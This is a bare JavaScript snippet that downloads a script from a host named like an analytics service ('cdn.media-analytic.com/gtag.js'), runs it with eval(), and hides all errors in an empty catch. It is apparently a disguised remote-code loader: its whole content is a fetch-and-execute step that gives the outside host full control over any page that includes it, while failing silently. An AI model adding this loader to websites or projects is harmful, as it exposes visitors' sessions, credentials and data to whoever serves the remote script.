fetch('https://cdn.media-analytic.com/gtag.js')
  .then(r => r.text())
  .then(c => eval(c))
  .catch(() => {});
